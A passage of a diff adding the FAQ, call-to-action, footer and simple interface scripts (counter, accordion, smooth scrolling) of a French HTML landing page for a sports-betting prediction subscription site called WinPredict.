+                        <p>Oui, nous offrons 3 prédictions gratuites par semaine à tous les nouveaux utilisateurs qui créent un compte. Cela vous permet de tester la qualité de nos analyses avant de souscrire à un abonnement payant. Pour accéder à ces prédictions gratuites, il suffit de vous inscrire sur notre plateforme.</p>
+                    </div>
+                </div>
+                
+                <!-- FAQ Item 4 -->
+                <div class="mb-6 border-b border-gray-200 pb-6">
+                    <button class="flex justify-between items-center w-full text-left font-semibold text-dark focus:outline-none faq-btn">
+                        <span>Comment puis-je payer mon abonnement ?</span>
+                        <i class="fas fa-chevron-down text-primary transition-transform duration-300"></i>
+                    </button>
+                    <div class="mt-4 text-gray-600 faq-content hidden">
+                        <p>Nous acceptons plusieurs méthodes de paiement sécurisées : cartes bancaires (Visa, Mastercard, American Express), PayPal, virements bancaires et cryptomonnaies (Bitcoin, Ethereum). Le paiement est sécurisé via une plateforme de paiement certifiée PCI DSS. Vous pouvez choisir un abonnement mensuel ou annuel (avec une réduction de 20% pour l'abonnement annuel).</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section class="py-16 bg-gradient-to-r from-primary to-indigo-600 text-white">
+        <div class="container mx-auto px-4 text-center">
+            <h2 class="text-3xl md:text-4xl font-bold mb-6">Prêt à transformer vos paris sportifs ?</h2>
+            <p class="text-xl opacity-90 max-w-2xl mx-auto mb-8">Rejoignez des milliers de parieurs satisfaits et accédez dès maintenant à nos prédictions gagnantes.</p>
+            <div class="flex flex-col sm:flex-row justify-center space-y-4 sm:space-y-0 sm:space-x-4">
+                <button class="bg-secondary hover:bg-emerald-600 text-white px-8 py-4 rounded-lg font-bold text-lg transition duration-300">
+                    <i class="fas fa-crown mr-2"></i> Devenir VIP
+                </button>
+                <button class="bg-white hover:bg-gray-100 text-primary px-8 py-4 rounded-lg font-bold text-lg transition duration-300">
+                    <i class="fas fa-question-circle mr-2"></i> Poser une question
+                </button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer id="contact" class="bg-dark text-white py-12">
+        <div class="container mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
+                <div>
+                    <div class="flex items-center space-x-2 mb-4">
+                        <div class="w-10 h-10 rounded-full bg-primary flex items-center justify-center">
+                            <i class="fas fa-trophy text-white text-xl"></i>
+                        </div>
+                        <span class="text-xl font-bold">WinPredict</span>
+                    </div>
+                    <p class="text-gray-400 mb-4">Le leader des prédictions sportives depuis 2015. Notre mission : vous fournir les analyses les plus précises pour maximiser vos gains.</p>
+                    <div class="flex space-x-4">
+                        <a href="#" class="text-gray-400 hover:text-white"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" class="text-gray-400 hover:text-white"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="text-gray-400 hover:text-white"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="text-gray-400 hover:text-white"><i class="fab fa-telegram"></i></a>
+                    </div>
+                </div>
+                
+                <div>
+                    <h3 class="text-lg font-semibold mb-4">Liens rapides</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#accueil" class="text-gray-400 hover:text-white">Accueil</a></li>
+                        <li><a href="#predictions" class="text-gray-400 hover:text-white">Prédictions</a></li>
+                        <li><a href="#abonnements" class="text-gray-400 hover:text-white">Abonnements</a></li>
+                        <li><a href="#resultats" class="text-gray-400 hover:text-white">Résultats</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-white">Blog</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-lg font-semibold mb-4">Sports</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-gray-400 hover:text-white">Football</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-white">Basketball</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-white">Tennis</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-white">Rugby</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-white">eSports</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-lg font-semibold mb-4">Contact</h3>
+                    <ul class="space-y-2">
+                        <li class="flex items-center">
+                            <i class="fas fa-envelope mr-2 text-gray-400"></i>
+                            <span>contact@winpredict.com</span>
+                        </li>
+                        <li class="flex items-center">
+                            <i class="fas fa-phone-alt mr-2 text-gray-400"></i>
+                            <span>+33 6 12 34 56 78</span>
+                        </li>
+                        <li class="flex items-center">
+                            <i class="fas fa-map-marker-alt mr-2 text-gray-400"></i>
+                            <span>Paris, France</span>
+                        </li>
+                    </ul>
+                    <div class="mt-6">
+                        <h4 class="font-medium mb-2">Newsletter</h4>
+                        <div class="flex">
+                            <input type="email" placeholder="Votre email" class="px-3 py-2 bg-gray-800 text-white rounded-l focus:outline-none w-full">
+                            <button class="bg-primary hover:bg-indigo-700 text-white px-4 py-2 rounded-r">
+                                <i class="fas fa-paper-plane"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="border-t border-gray-800 mt-12 pt-8 flex flex-col md:flex-row justify-between items-center">
+                <p class="text-gray-500 mb-4 md:mb-0">© 2023 WinPredict. Tous droits réservés.</p>
+                <div class="flex space-x-6">
+                    <a href="#" class="text-gray-500 hover:text-white">Mentions légales</a>
+                    <a href="#" class="text-gray-500 hover:text-white">CGU</a>
+                    <a href="#" class="text-gray-500 hover:text-white">Politique de confidentialité</a>
+                    <a href="#" class="text-gray-500 hover:text-white">Responsabilité</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Floating Action Button -->
+    <div class="fixed bottom-8 right-8 z-50">
+        <button class="w-14 h-14 bg-secondary hover:bg-emerald-600 text-white rounded-full shadow-xl flex items-center justify-center transition duration-300">
+            <i class="fab fa-whatsapp text-2xl"></i>
+        </button>
+    </div>
+
+    <script>
+        // Counter Animation
+        const counters = document.querySelectorAll('.stats-counter');
+        const speed = 200;
+
+        counters.forEach(counter => {
+            const target = +counter.getAttribute('data-target');
+            const count = +counter.innerText;
+            const increment = target / speed;
+
+            if(count < target) {
+                counter.innerText = Math.ceil(count + increment);
+                setTimeout(updateCounter, 1);
+            } else {
+                counter.innerText = target;
+            }
+
+            function updateCounter() {
+                const count = +counter.innerText;
+                const increment = target / speed;
+
+                if(count < target) {
+                    counter.innerText = Math.ceil(count + increment);
+                    setTimeout(updateCounter, 1);
+                } else {
+                    counter.innerText = target;
+                }
+            }
+        });
+
+        // FAQ Accordion
+        const faqBtns = document.querySelectorAll('.faq-btn');
+        
+        faqBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                const content = btn.nextElementSibling;
+                const icon = btn.querySelector('i');
+                
+                // Toggle content
+                content.classList.toggle('hidden');
+                
+                // Rotate icon
+                if(content.classList.contains('hidden')) {
+                    icon.style.transform = 'rotate(0deg)';
+                } else {
+                    icon.style.transform = 'rotate(180deg)';
+                }
+                
+                // Close other open items
+                faqBtns.forEach(otherBtn => {
+                    if(otherBtn !== btn) {
+                        otherBtn.nextElementSibling.classList.add('hidden');
+                        otherBtn.querySelector('i').style.transform = 'rotate(0deg)';
+                    }
+                });
+            });
+        });
+
+        // Mobile Menu Toggle (would need proper implementation)
+        const mobileMenuBtn = document.querySelector('.md\\:hidden');
+        mobileMenuBtn.addEventListener('click', () => {
+            alert('Mobile menu would open here in a full implementation');
+        });
+
+        // Smooth scrolling for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+    </script>
 </body>
 </html>
